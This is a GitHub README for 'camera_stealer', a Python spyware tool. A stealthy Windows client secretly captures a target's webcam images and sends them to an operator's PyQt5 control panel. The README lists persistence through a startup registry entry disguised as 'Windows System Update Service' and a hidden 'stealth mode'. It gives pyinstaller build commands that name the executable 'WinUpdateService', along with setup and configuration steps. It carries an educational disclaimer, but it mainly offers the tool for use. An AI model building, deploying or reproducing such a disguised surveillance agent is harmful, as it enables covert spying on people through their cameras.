<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.8+">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="MIT License">
  <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
  <img src="https://img.shields.io/badge/GUI-PyQt5-41CD52?style=for-the-badge&logo=qt&logoColor=white" alt="PyQt5">
  <img src="https://img.shields.io/badge/Encryption-SSL%2FTLS-red?style=for-the-badge&logo=letsencrypt&logoColor=white" alt="SSL/TLS">
</p>

# 📷 Remote Camera Control Tool

A client-server application for **remote webcam capture** over an encrypted SSL/TLS connection. Built with Python, featuring a modern PyQt5 GUI for the server and a lightweight, persistent client agent for Windows.

> ⚠️ **Disclaimer:** This tool is developed strictly for **educational and authorized security research purposes**. Unauthorized use of this software against systems you do not own or have explicit permission to test is **illegal** and **unethical**. The author assumes no liability for misuse.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🖥️ **Modern GUI** | Sleek PyQt5-based control panel for managing connected clients |
| 🔒 **SSL/TLS Encryption** | All communications are encrypted using SSL/TLS certificates |
| 📸 **Remote Webcam Capture** | Capture images from client webcams with a single click |
| 💾 **Image Saving** | Save captured images locally with timestamps |
| 👥 **Multi-Client Support** | Manage and control multiple connected clients simultaneously |
| 🔄 **Auto-Reconnect** | Client automatically reconnects if the connection is lost |
| 🏃 **Auto-Persistence** | Client registers itself in Windows startup registry |
| 👻 **Stealth Mode** | Client runs silently in the background with no visible window |
| ❤️ **Keep-Alive** | Built-in heartbeat mechanism to maintain stable connections |

---

## 📁 Project Structure

```
camera_stealer/
├── server.py            # Server application with PyQt5 GUI
├── client.py            # Client agent source code
├── server.crt           # SSL certificate for encrypted communication
├── server.key           # SSL private key
├── requirements.txt     # Python dependencies
├── LICENSE              # MIT License
├── USAGE.md             # Detailed usage guide
└── .gitignore           # Git ignore rules
```

---

## 🔧 Architecture

```
┌──────────────────────┐          SSL/TLS          ┌──────────────────────┐
│     SERVER (You)      │◄────────────────────────►│   CLIENT (Target)     │
│                       │                           │                       │
│  • PyQt5 GUI          │   ┌─────────────────┐    │  • Webcam capture     │
│  • Client management  │   │  Encrypted Link  │    │  • Auto-reconnect    │
│  • Image viewer       │   │  Port 5555       │    │  • Persistence       │
│  • Save to disk       │   └─────────────────┘    │  • Stealth operation  │
└──────────────────────┘                           └──────────────────────┘
```

### Communication Protocol

| Message Type | Direction | Description |
|---|---|---|
| `SYS_INFO` | Client → Server | System info (`username@hostname`) sent on connection |
| `PING` | Client → Server | Keep-alive heartbeat (every 20s) |
| `take_picture` | Server → Client | Command to capture a webcam image |
| `IMG_DATA` | Client → Server | Captured JPEG image data |

---

## 🚀 Quick Start

### Prerequisites

| Component | Requirement |
|---|---|
| **Python** | 3.8 or higher |
| **Server OS** | Windows / Linux / macOS |
| **Client OS** | Windows (uses `winreg` for persistence) |
| **Network** | Both machines must be reachable over the network |

### 1. Clone the Repository

```bash
git clone https://github.com/EsmailAlansi/camera_stealer.git
cd camera_stealer
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 3. Configure the Server IP

Edit `server.py` and `client.py` to set your server's IP address:

```python
# In both server.py and client.py
SERVER_HOST = "192.168.0.103"  # ← Replace with your server IP
SERVER_PORT = 5555
```

### 4. Run the Server

```bash
python server.py
```

The GUI control panel will open, ready to accept incoming client connections.

### 5. Run the Client (on target machine)

```bash
python client.py
```

Or build a standalone executable:

```bash
pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
```

The compiled executable will be in the `dist/` folder.

---

## 🖥️ Server GUI

The server provides an intuitive control panel with:

- **Connected Clients List** — Shows all active client connections with `username@hostname`
- **Control Panel** — Select a client and capture webcam images
- **Image Viewer** — View captured images in a popup dialog with save functionality

---

## ⚙️ Configuration

### Server Settings (`server.py`)

```python
HOST = '192.168.0.103'   # Server bind address
PORT = 5555               # Server listening port
```

### Client Settings (`client.py`)

```python
SERVER_HOST = "192.168.0.103"   # Server IP to connect to
SERVER_PORT = 5555               # Server port
RECONNECT_DELAY = 15             # Seconds between reconnection attempts
KEEP_ALIVE_INTERVAL = 20         # Seconds between heartbeat pings
REGISTRY_KEY_NAME = "Windows System Update Service"  # Startup registry entry name
```

### SSL Certificates

The project includes self-signed certificates (`server.crt` and `server.key`). To generate new ones:

```bash
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
```

---

## 🔨 Building the Client Executable

To create a standalone `.exe` that runs without Python installed:

```bash
# Install build dependencies
pip install opencv-python pyinstaller

# Build the executable
pyinstaller --onefile --noconsole --name "WinUpdateService" client.py
```

| Flag | Purpose |
|---|---|
| `--onefile` | Bundle everything into a single executable |
| `--noconsole` | Hide the console window (stealth mode) |
| `--name` | Set the output executable name |

The executable will be created at `dist/WinUpdateService.exe`.

---

## 📋 Requirements

```
PyQt5              # Server GUI framework
opencv-python      # Webcam capture (client-side)
pyinstaller        # Build standalone executable (optional)
```

---

## ⚠️ Legal Disclaimer

This software is provided for **educational purposes only**. It is intended to demonstrate:

- Client-server socket programming
- SSL/TLS encrypted communication
- GUI development with PyQt5
- Windows system integration concepts

**Do NOT use this tool for unauthorized access.** Always obtain explicit written permission before testing on any system. The author is not responsible for any misuse or damage caused by this software.

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/your-feature`)
3. Commit your changes (`git commit -m "Add: description"`)
4. Push to the branch (`git push origin feature/your-feature`)
5. Open a Pull Request

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**Esmail AL-ansi**

- GitHub: [@EsmailAlansi](https://github.com/EsmailAlansi)

---

<p align="center">
  <sub>Built with ❤️ for cybersecurity education and research</sub>
</p>